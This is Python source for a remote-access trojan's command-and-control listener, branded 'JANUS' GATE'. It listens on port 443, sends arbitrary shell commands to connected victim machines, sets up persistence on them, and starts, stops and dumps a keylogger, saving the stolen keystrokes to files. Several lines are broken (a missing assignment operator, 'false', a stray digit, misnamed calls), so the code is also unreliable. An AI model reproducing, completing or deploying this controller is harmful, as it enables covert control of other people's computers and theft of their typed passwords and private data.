import os
import sys
import socket
from datetime import datetime

HOST = "0.0.0.0"
PORT = 443
KEYLOGGER_PATH "keylog_dumps"

def print_banner():
    print("""
    ▐▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▌
    ▐             JANUS' GATE COMMAND & CONTROL CENTER              ▌
    ▐                       By Bl4ck0ni                             ▌
    ▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌
    """)

def print_help():
    print("""
    ▐▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▌
    ▐                      AVALIABLE COMMANDS                       ▌
    ▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌
    ▐                                                               ▌  
    ▐    PERSISTENCE:                                               ▌  
    ▐       /persistence status     - Check persistence status      ▌  
    ▐       /persistence setup      - Setup persistence             ▌  
    ▐                                                               ▌  
    ▐   KEYLOGGER:                                                  ▌  
    ▐       /keylog status          - Check keylogger status        ▌  
    ▐       /keylog start           - Start keylogger               ▌  
    ▐       /keylog stop            - Stop keylogger                ▌  
    ▐       /keylog dump            - Dump captured keys            ▌  
    ▐                                                               ▌  
    ▐   SYSTEM:                                                     ▌  
    ▐       cd <path>               - Change directory              ▌  
    ▐       /exit                   - Disconnect client             ▌  
    ▐       /help                   - Show this help menu           ▌    
    ▐       /clear                  - Clear screen                  ▌  
    ▐                                                               ▌  
    ▐   SHELL COMMANDS:                                             ▌  
    ▐       Any other command will be executed as shell command     ▌      
    ▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌
    """)

def clear_system():
    os.system('cls' if os.name == 'nt' else 'clear')

def save_keylog(data, filename=None):
    try:
        if not os.path.exists(KEYLOGGER_PATH):
            os.makedirs(KEYLOGGER_PATH)
        
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"keylog_{timestamp}.txt"

        file_path = os.path.join(KEYLOGGER_PATH, filename)

        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(data)
        
        print(f"\n[+] keylog saved as: {filename}")
        return True

    except Exception as e:
        print(f"\n[-] Error saving keylog: {e}")
        return false

def handle_client(conn, addr):
    print(f"\n[#] Client connected from {addr[0]:{addr}}")
    print(f"\n[i] Connection estabilished at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("[i] type '/help' for available commands\n")0

    try:
        initial_msg = conn.recv(1024).decode('utf-8', errors='ignore')
        if initial_msg:
            print(initial_msg, end='')

        while True:
            try:
                command = input(f"\033[1;32m{addr[0]}\033[1;36m>\033[0;0m ").strip()

                if not command:
                    continue

                if command == "/help":
                    print_help()
                    continue

                if command == "/clear":
                    clear_system()
                    print_banner()
                    print(f'[#] Connected to {addr[0]}:{addr[1]}\n')
                    continue

                conn.send(command.encode() + b"\n")

                if command == "/exit":
                    print("\n[!] Client disconnected")
                    break

                response = b""
                conn.timeout(2.0)

                while True:
                    try:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break

                        response += chunk

                        if response.endswith(b"\n\n"):
                            break

                    except socket.timeout:
                        break

                if response:
                    decoded = response.decode('utf-8', errors='ignore')

                    if "[AUTO-SEND]" in decoded:
                        keylog_content = decoded.split("[AUTO-SEND]")[1].strip()
                        save_keylog(keylog_content)
                    
                    elif command == "/keylog dump":
                        print(decoded)

                        if "[+] Keylog captured" in decode:
                            save = input("Save this keylog? (y/n): ").lower()
                            if save == 'y':
                                save_keylog(decoded)
                    else:
                        print(decoded, end="")
                else:
                    print("[!] No response from client")

            except KeyboardInterrupt:
                print("\n [!] Interrupted. Sending exit command ...")
                conn.send(b"/exit\n")
                break
            
            except Exception as e:
                print(f"\n [-] Error: {e}")
        

    except Exception as e:
        print(f"[-] Connection error: {e}")

    finally:
        conn.close()
        print("\n[!] Connection closed")

def start_listener():
    # print_banner()

    try: 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)

        print(f"[i] Listening on {HOST}:{PORT}\n")
        print(f"[i] Waiting for connections ... \n")


        while True:
            try:
                connection, addr = s.accept()
                handle_client(connection, addr)

                print("\n" + "="*60)
                choice = input("Wait for new connection? (y/n): ").lower()

                if choice != 'y':
                    print("[!] Shutting sown listener ...")
                    break
                
                print(f"\n[i] Waiting for connections ... \n")


            except KeyboardInterrupt:
                print("\n[!] Interrupted by user")
                break
        
    
    except Exception as e:
        print(f"[-] Listener error: {e}")

    
    finally:
        s.close()
        print("[!] Listener stopped")


if __name__ == "__main__":
    try:
        start_listener()
    
    except KeyboardInterrupt:
        print("\n[!] Exiting ... ")
        sys.exit(0)